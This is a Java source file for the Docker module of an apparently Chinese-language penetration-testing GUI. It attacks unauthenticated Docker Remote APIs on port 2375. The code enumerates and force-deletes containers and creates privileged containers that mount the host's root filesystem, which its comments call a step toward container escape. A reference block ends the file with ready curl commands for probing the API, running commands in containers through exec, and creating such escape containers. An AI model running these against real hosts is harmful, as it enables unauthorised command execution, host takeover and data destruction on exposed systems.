package com.k8spen.tool.controller;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.k8spen.tool.helper.DockerContainerItem;
import com.k8spen.tool.helper.DockerImageItem;
import com.k8spen.tool.helper.DockerInfoParser;
import com.k8spen.tool.utils.DockerApiUtil;
import com.k8spen.tool.view.CommandCards;
import com.k8spen.tool.view.ResultPane;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Task;
import javafx.scene.control.Alert;
import javafx.scene.control.ButtonBar;
import javafx.scene.control.ButtonType;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.ListCell;
import javafx.scene.control.TableCell;
import javafx.scene.control.TableColumn;
import javafx.scene.control.TableView;
import javafx.scene.control.TextField;
import javafx.scene.control.Tooltip;
import javafx.scene.control.cell.PropertyValueFactory;

import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.LinkedHashSet;
import java.util.Optional;

/**
 * Docker API — 连接与概览、容器管理、镜像管理。
 *
 * 移植自 DockerAPITool v0.1（docker-java 实现），此处改为直接调用 Docker Engine
 * Remote API（纯 HttpURLConnection），未授权 2375 端口即可完成同样的攻击面操作。
 */
public class DockerHandler {

    private final ControllerContext ctx;

    // 连接与概览
    private final ResultPane dockerInfoOutput;
    private final CommandCards dockerReference;

    // 容器管理
    private final TableView<DockerContainerItem> dockerContainerTable;
    private final TableColumn<DockerContainerItem, String> dockerColContainerId;
    private final TableColumn<DockerContainerItem, String> dockerColContainerName;
    private final TableColumn<DockerContainerItem, String> dockerColContainerImage;
    private final TableColumn<DockerContainerItem, String> dockerColContainerState;
    private final TableColumn<DockerContainerItem, String> dockerColContainerStatus;
    private final Label dockerContainerCount;
    private final ResultPane dockerContainerOutput;
    private final ComboBox<String> dockerCreateImage;
    private final TextField dockerCreateName;
    private final TextField dockerCreateHostDir;
    private final TextField dockerCreateContainerDir;
    private final CheckBox dockerCreatePrivileged;

    // 镜像管理
    private final TableView<DockerImageItem> dockerImageTable;
    private final TableColumn<DockerImageItem, String> dockerColImageId;
    private final TableColumn<DockerImageItem, String> dockerColImageTag;
    private final TableColumn<DockerImageItem, String> dockerColImageSize;
    private final TableColumn<DockerImageItem, String> dockerColImageCreated;
    private final Label dockerImageCount;

    /** 容器列表同时对“命令执行/容器逃逸”两个下拉框共享 */
    private final ObservableList<DockerContainerItem> containers = FXCollections.observableArrayList();
    private final ObservableList<DockerImageItem> images = FXCollections.observableArrayList();

    public DockerHandler(ControllerContext ctx,
                         ResultPane dockerInfoOutput, CommandCards dockerReference,
                         TableView<DockerContainerItem> dockerContainerTable,
                         TableColumn<DockerContainerItem, String> dockerColContainerId,
                         TableColumn<DockerContainerItem, String> dockerColContainerName,
                         TableColumn<DockerContainerItem, String> dockerColContainerImage,
                         TableColumn<DockerContainerItem, String> dockerColContainerState,
                         TableColumn<DockerContainerItem, String> dockerColContainerStatus,
                         Label dockerContainerCount, ResultPane dockerContainerOutput,
                         ComboBox<String> dockerCreateImage, TextField dockerCreateName,
                         TextField dockerCreateHostDir, TextField dockerCreateContainerDir,
                         CheckBox dockerCreatePrivileged,
                         TableView<DockerImageItem> dockerImageTable,
                         TableColumn<DockerImageItem, String> dockerColImageId,
                         TableColumn<DockerImageItem, String> dockerColImageTag,
                         TableColumn<DockerImageItem, String> dockerColImageSize,
                         TableColumn<DockerImageItem, String> dockerColImageCreated,
                         Label dockerImageCount) {
        this.ctx = ctx;
        this.dockerInfoOutput = dockerInfoOutput;
        this.dockerReference = dockerReference;
        this.dockerContainerTable = dockerContainerTable;
        this.dockerColContainerId = dockerColContainerId;
        this.dockerColContainerName = dockerColContainerName;
        this.dockerColContainerImage = dockerColContainerImage;
        this.dockerColContainerState = dockerColContainerState;
        this.dockerColContainerStatus = dockerColContainerStatus;
        this.dockerContainerCount = dockerContainerCount;
        this.dockerContainerOutput = dockerContainerOutput;
        this.dockerCreateImage = dockerCreateImage;
        this.dockerCreateName = dockerCreateName;
        this.dockerCreateHostDir = dockerCreateHostDir;
        this.dockerCreateContainerDir = dockerCreateContainerDir;
        this.dockerCreatePrivileged = dockerCreatePrivileged;
        this.dockerImageTable = dockerImageTable;
        this.dockerColImageId = dockerColImageId;
        this.dockerColImageTag = dockerColImageTag;
        this.dockerColImageSize = dockerColImageSize;
        this.dockerColImageCreated = dockerColImageCreated;
        this.dockerImageCount = dockerImageCount;
    }

    public void init() {
        dockerColContainerId.setCellValueFactory(new PropertyValueFactory<>("id"));
        dockerColContainerName.setCellValueFactory(new PropertyValueFactory<>("name"));
        dockerColContainerImage.setCellValueFactory(new PropertyValueFactory<>("image"));
        dockerColContainerState.setCellValueFactory(new PropertyValueFactory<>("state"));
        dockerColContainerStatus.setCellValueFactory(new PropertyValueFactory<>("status"));
        dockerContainerTable.setItems(containers);

        dockerColImageId.setCellValueFactory(new PropertyValueFactory<>("imageId"));
        dockerColImageTag.setCellValueFactory(new PropertyValueFactory<>("repoTags"));
        dockerColImageTag.setCellFactory(column -> new TableCell<>() {
            @Override protected void updateItem(String value, boolean empty) {
                super.updateItem(value, empty);
                setText(empty ? null : value);
                setTooltip(empty || value == null ? null : imageTooltip(value));
            }
        });
        dockerColImageSize.setCellValueFactory(new PropertyValueFactory<>("size"));
        dockerColImageCreated.setCellValueFactory(new PropertyValueFactory<>("created"));
        dockerImageTable.setItems(images);

        // 双击镜像回填有效标签，无标签时使用完整镜像 ID。
        dockerImageTable.setRowFactory(table -> {
            javafx.scene.control.TableRow<DockerImageItem> row = new javafx.scene.control.TableRow<>();
            row.setOnMouseClicked(event -> {
                if (event.getClickCount() == 2 && !row.isEmpty()) {
                    String reference = row.getItem().getImageReference();
                    if (DockerImageItem.hasReference(reference)) {
                        dockerCreateImage.setValue(reference);
                        dockerCreateImage.getEditor().positionCaret(0);
                        ctx.log("[*] 已选择镜像: " + reference);
                    } else {
                        ctx.log("[-] 此记录没有可用的镜像标签或 ID");
                    }
                }
            });
            return row;
        });

        dockerCreateImage.setEditable(true);
        dockerCreateImage.setVisibleRowCount(8);
        dockerCreateImage.setCellFactory(list -> new ListCell<>() {
            @Override protected void updateItem(String reference, boolean empty) {
                super.updateItem(reference, empty);
                String label = reference;
                if (!empty && reference != null) {
                    label = images.stream().filter(image -> !image.hasRepoTags() && reference.equals(image.getFullId()))
                            .map(DockerImageItem::getRepoTags).findFirst().orElse(reference);
                }
                setText(empty ? null : label);
                setTooltip(empty || reference == null ? null : imageTooltip(reference));
            }
        });
        dockerReference.setText(DOCKER_REFERENCE);
    }

    public ObservableList<DockerContainerItem> containers() {
        return containers;
    }

    /**
     * 每次操作均从顶部目标配置读取连接参数。
     */
    public DockerApiUtil client() {
        String baseUrl = ctx.getApiBaseUrl();
        return baseUrl == null ? null : new DockerApiUtil(baseUrl, ctx.getTimeout());
    }

    // ==== 连接与概览 ====

    public void connect() {
        DockerApiUtil api = client();
        if (api == null) return;
        dockerInfoOutput.setText("正在获取 Docker 信息...");
        ctx.setStatus("正在获取 Docker 概览: " + api.getBaseUrl());
        ctx.log("[*] GET " + api.getBaseUrl() + "/version");

        Task<String[]> task = new Task<>() {
            @Override
            protected String[] call() throws Exception {
                DockerApiUtil.Response version = api.request("GET", "/version", null);
                DockerApiUtil.Response info = api.request("GET", "/info", null);
                return new String[]{String.valueOf(version.code()), version.body(),
                        String.valueOf(info.code()), info.body()};
            }
        };
        task.setOnSucceeded(event -> {
            String[] result = task.getValue();
            String raw = "[HTTP " + result[2] + "]\n" + result[3];
            dockerInfoOutput.showResponse(raw, DockerInfoParser.format(result[3], result[1]));
            if ("200".equals(result[2])) {
                ctx.log("[+] Docker 概览已获取: " + api.getBaseUrl());
                ctx.setStatus("Docker 概览已刷新");
                refreshContainers();
                refreshImages();
            } else {
                ctx.log("[-] Docker API 返回异常: HTTP " + result[2]);
                ctx.setStatus("Docker API 响应异常");
            }
        });
        task.setOnFailed(event -> fail("获取 Docker 概览", task.getException()));
        new Thread(task).start();
    }

    // ==== 容器管理 ====

    public void refreshContainers() {
        DockerApiUtil api = client();
        if (api == null) return;
        ctx.setStatus("正在获取容器列表...");
        Task<DockerApiUtil.Response> task = new Task<>() {
            @Override
            protected DockerApiUtil.Response call() throws Exception {
                return api.request("GET", "/containers/json?all=1", null);
            }
        };
        task.setOnSucceeded(event -> applyContainers(task.getValue()));
        task.setOnFailed(event -> fail("获取容器列表", task.getException()));
        new Thread(task).start();
    }

    private void applyContainers(DockerApiUtil.Response response) {
        if (!response.ok()) {
            ctx.log("[-] 获取容器列表失败: HTTP " + response.code());
            return;
        }
        JsonArray array = response.asArray();
        List<DockerContainerItem> items = new ArrayList<>();
        if (array != null) {
            for (JsonElement element : array) {
                if (!element.isJsonObject()) continue;
                JsonObject container = element.getAsJsonObject();
                String name = firstName(array(container, "Names"));
                String image = string(container, "Image");
                if (!DockerImageItem.hasReference(image)) image = string(container, "ImageID");
                items.add(new DockerContainerItem(
                        string(container, "Id"),
                        name,
                        image,
                        string(container, "State"),
                        string(container, "Status")));
            }
        }
        containers.setAll(items);
        dockerContainerCount.setText("共 " + items.size() + " 个容器");
        ctx.log("[+] 容器列表已刷新: " + items.size() + " 个");
        ctx.setStatus("容器列表已刷新");
    }

    public void containerStart() {
        containerAction("start", "启动");
    }

    public void containerStop() {
        containerAction("stop", "停止");
    }

    private void containerAction(String operation, String label) {
        DockerContainerItem selected = dockerContainerTable.getSelectionModel().getSelectedItem();
        if (selected == null) {
            ctx.log("[-] 请先在容器列表中选择一个容器");
            return;
        }
        DockerApiUtil api = client();
        if (api == null) return;
        ctx.setStatus("正在" + label + "容器: " + selected.getName());
        Task<DockerApiUtil.Response> task = new Task<>() {
            @Override
            protected DockerApiUtil.Response call() throws Exception {
                return api.request("POST", "/containers/" + selected.getFullId() + "/" + operation, null);
            }
        };
        task.setOnSucceeded(event -> {
            DockerApiUtil.Response response = task.getValue();
            dockerContainerOutput.showResponse(response.display(),
                    label + "容器 " + selected.getName() + " → HTTP " + response.code());
            // Docker 对“已启动/已停止”的容器返回 304，视为成功
            boolean success = response.ok() || response.code() == 304;
            if (success) {
                ctx.log("[+] 已" + label + "容器: " + selected.getName()
                        + (response.code() == 304 ? "（状态未变化）" : ""));
                ctx.setStatus("已" + label + "容器 " + selected.getName());
                refreshContainers();
            } else {
                ctx.log("[-]" + label + "容器失败: HTTP " + response.code());
            }
        });
        task.setOnFailed(event -> fail(label + "容器", task.getException()));
        new Thread(task).start();
    }

    public void containerDetail() {
        DockerContainerItem selected = dockerContainerTable.getSelectionModel().getSelectedItem();
        if (selected == null) {
            ctx.log("[-] 请先在容器列表中选择一个容器");
            return;
        }
        DockerApiUtil api = client();
        if (api == null) return;
        Task<DockerApiUtil.Response> task = new Task<>() {
            @Override
            protected DockerApiUtil.Response call() throws Exception {
                return api.request("GET", "/containers/" + selected.getFullId() + "/json", null);
            }
        };
        task.setOnSucceeded(event -> {
            DockerApiUtil.Response response = task.getValue();
            dockerContainerOutput.showResponse(response.display(),
                    "容器 " + selected.getName() + " 详情（原始响应可在“表格/原始响应”中切换查看）");
            ctx.log("[+] 已获取容器详情: " + selected.getName());
        });
        task.setOnFailed(event -> fail("获取容器详情", task.getException()));
        new Thread(task).start();
    }

    public void containerDelete() {
        DockerContainerItem selected = dockerContainerTable.getSelectionModel().getSelectedItem();
        if (selected == null) {
            ctx.log("[-] 请先在容器列表中选择一个容器");
            return;
        }
        Alert alert = new Alert(Alert.AlertType.CONFIRMATION);
        alert.setTitle("确认删除");
        alert.setHeaderText(null);
        alert.setContentText("确定强制删除容器 " + selected.getName() + " 吗？\n运行中的容器会被先停止。");
        Optional<ButtonType> answer = alert.showAndWait();
        if (answer.isEmpty() || !ButtonBar.ButtonData.OK_DONE.equals(answer.get().getButtonData())) return;

        DockerApiUtil api = client();
        if (api == null) return;
        Task<DockerApiUtil.Response> task = new Task<>() {
            @Override
            protected DockerApiUtil.Response call() throws Exception {
                return api.request("DELETE", "/containers/" + selected.getFullId() + "?force=true", null);
            }
        };
        task.setOnSucceeded(event -> {
            DockerApiUtil.Response response = task.getValue();
            dockerContainerOutput.showResponse(response.display(),
                    "删除容器 " + selected.getName() + " → HTTP " + response.code());
            if (response.ok()) {
                ctx.log("[+] 已删除容器: " + selected.getName());
                refreshContainers();
            } else {
                ctx.log("[-] 删除容器失败: HTTP " + response.code());
            }
        });
        task.setOnFailed(event -> fail("删除容器", task.getException()));
        new Thread(task).start();
    }

    public void createContainer() {
        String image = dockerCreateImage.getEditor().getText() == null
                ? "" : dockerCreateImage.getEditor().getText().trim();
        if (!DockerImageItem.hasReference(image)) {
            ctx.log("[-] 请选择有效的镜像标签或 ID，不能使用空值、- 或 <none>");
            return;
        }
        String name = dockerCreateName.getText() == null ? "" : dockerCreateName.getText().trim();
        String hostDir = blankTo(dockerCreateHostDir.getText(), "/");
        String containerDir = blankTo(dockerCreateContainerDir.getText(), "/peninfo");
        boolean privileged = dockerCreatePrivileged.isSelected();

        JsonObject hostConfig = new JsonObject();
        JsonArray binds = new JsonArray();
        binds.add(hostDir + ":" + containerDir);
        hostConfig.add("Binds", binds);
        hostConfig.addProperty("Privileged", privileged);

        JsonObject body = new JsonObject();
        body.addProperty("Image", image);
        body.addProperty("Tty", true);
        body.addProperty("OpenStdin", true);
        body.add("HostConfig", hostConfig);

        String path = "/containers/create"
                + (name.isEmpty() ? "" : "?name=" + URLEncoder.encode(name, StandardCharsets.UTF_8));

        DockerApiUtil api = client();
        if (api == null) return;
        ctx.setStatus("正在创建容器: " + image);
        ctx.log("[*] POST /containers/create image=" + image + " bind=" + hostDir + ":" + containerDir
                + " privileged=" + privileged);

        Task<String> task = new Task<>() {
            @Override
            protected String call() throws Exception {
                DockerApiUtil.Response created = api.request("POST", path, body.toString());
                if (!created.ok()) return "创建容器失败\n" + created.display();
                JsonObject json = created.asObject();
                String id = json != null && json.has("Id") ? json.get("Id").getAsString() : "";
                if (id.isEmpty()) return "创建容器失败: 响应缺少容器 Id\n" + created.display();
                DockerApiUtil.Response started = api.request("POST", "/containers/" + id + "/start", null);

                StringBuilder sb = new StringBuilder();
                sb.append("========== 创建容器 ==========\n").append(created.display()).append("\n\n");
                sb.append("容器 ID: ").append(id).append("\n\n");
                sb.append("========== 启动容器 ==========\n").append(started.display()).append("\n");
                if (!started.ok()) {
                    sb.append("\n[!] 容器已创建但启动失败，请检查镜像入口或挂载路径\n");
                }
                return sb.toString();
            }
        };
        task.setOnSucceeded(event -> {
            String output = task.getValue();
            dockerContainerOutput.setPlainText(output);
            if (output.startsWith("创建容器失败")) {
                ctx.log("[-] 创建容器失败");
                ctx.setStatus("创建容器失败");
            } else {
                ctx.log("[+] 容器已创建并启动: " + image);
                ctx.setStatus("容器已创建: " + image);
                refreshContainers();
            }
        });
        task.setOnFailed(event -> fail("创建容器", task.getException()));
        new Thread(task).start();
    }

    // ==== 镜像管理 ====

    public void refreshImages() {
        DockerApiUtil api = client();
        if (api == null) return;
        ctx.setStatus("正在获取镜像列表...");
        Task<DockerApiUtil.Response> task = new Task<>() {
            @Override
            protected DockerApiUtil.Response call() throws Exception {
                return api.request("GET", "/images/json", null);
            }
        };
        task.setOnSucceeded(event -> applyImages(task.getValue()));
        task.setOnFailed(event -> fail("获取镜像列表", task.getException()));
        new Thread(task).start();
    }

    private void applyImages(DockerApiUtil.Response response) {
        if (!response.ok()) {
            ctx.log("[-] 获取镜像列表失败: HTTP " + response.code());
            return;
        }
        String typed = dockerCreateImage.getEditor().getText();
        List<DockerImageItem> items = new ArrayList<>();
        LinkedHashSet<String> references = new LinkedHashSet<>();
        JsonArray array = response.asArray();
        if (array != null) {
            for (JsonElement element : array) {
                if (!element.isJsonObject()) continue;
                JsonObject image = element.getAsJsonObject();
                String repoTag = joinArray(array(image, "RepoTags"));
                long size = image.has("Size") && !image.get("Size").isJsonNull() ? image.get("Size").getAsLong() : 0L;
                long created = image.has("Created") && !image.get("Created").isJsonNull() ? image.get("Created").getAsLong() : 0L;
                DockerImageItem item = new DockerImageItem(string(image, "Id"), repoTag, size, created);
                items.add(item);
                references.addAll(item.getImageReferences());
            }
        }
        images.setAll(items);
        long untagged = items.stream().filter(image -> !image.hasRepoTags()).count();
        dockerImageCount.setText("共 " + items.size() + " 个镜像" + (untagged > 0 ? " · " + untagged + " 个未打标签" : ""));
        dockerCreateImage.getItems().setAll(references);
        dockerCreateImage.setValue(null);
        if (DockerImageItem.hasReference(typed)) dockerCreateImage.setValue(typed);
        else dockerCreateImage.getEditor().clear();
        ctx.log("[+] 镜像列表已刷新: " + items.size() + " 个");
        ctx.setStatus("镜像列表已刷新");
    }

    // ==== 工具方法 ====

    private void fail(String action, Throwable error) {
        String message = error == null ? "未知错误" : String.valueOf(error.getMessage());
        ctx.log("[-] " + action + "失败: " + message);
        ctx.setStatus(action + "失败");
    }

    private static String blankTo(String value, String fallback) {
        return value == null || value.isBlank() ? fallback : value.trim();
    }

    private static String string(JsonObject json, String key) {
        JsonElement element = json.get(key);
        return element == null || element.isJsonNull() ? "" : element.getAsString();
    }

    private static String firstName(JsonArray names) {
        if (names != null) {
            for (JsonElement value : names) {
                if (!value.isJsonPrimitive() || !value.getAsJsonPrimitive().isString()) continue;
                String name = value.getAsString().trim();
                if (name.startsWith("/")) name = name.substring(1);
                if (!name.isBlank() && !"-".equals(name)) return name;
            }
        }
        return "";
    }

    private static String joinArray(JsonArray values) {
        if (values == null || values.size() == 0) return "";
        List<String> items = new ArrayList<>();
        for (JsonElement value : values) {
            if (value == null || !value.isJsonPrimitive() || !value.getAsJsonPrimitive().isString()) continue;
            items.add(value.getAsString());
        }
        return String.join(", ", items);
    }

    private static JsonArray array(JsonObject json, String key) {
        return json.get(key) instanceof JsonArray values ? values : null;
    }

    private static Tooltip imageTooltip(String text) {
        Tooltip tooltip = new Tooltip(text);
        tooltip.setWrapText(true);
        tooltip.setMaxWidth(640);
        return tooltip;
    }

    private static final String DOCKER_REFERENCE =
            "# 探测未授权的 Docker Remote API\n"
            + "curl -s http://<IP>:2375/version\n\n"
            + "# 查看宿主机与容器信息\n"
            + "curl -s http://<IP>:2375/info\n\n"
            + "# 列出全部容器\n"
            + "curl -s http://<IP>:2375/containers/json?all=1\n\n"
            + "# 在容器内执行命令（创建 exec）\n"
            + "curl -s -X POST http://<IP>:2375/containers/<CID>/exec -H 'Content-Type: application/json' -d '{\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"Cmd\":[\"id\"]}'\n\n"
            + "# 启动上一步返回的 exec\n"
            + "curl -s -X POST http://<IP>:2375/exec/<EXEC_ID>/start -H 'Content-Type: application/json' -d '{\"Detach\":false,\"Tty\":true}'\n\n"
            + "# 创建特权容器并挂载宿主机根目录（容器逃逸前置条件）\n"
            + "curl -s -X POST 'http://<IP>:2375/containers/create?name=sectest' -H 'Content-Type: application/json' -d '{\"Image\":\"ubuntu\",\"Tty\":true,\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/peninfo\"]}}'\n\n"
            + "# 2376 端口若为 TLS 但未启用客户端证书校验，可直接改用 https\n"
            + "curl -sk https://<IP>:2376/version\n";
}
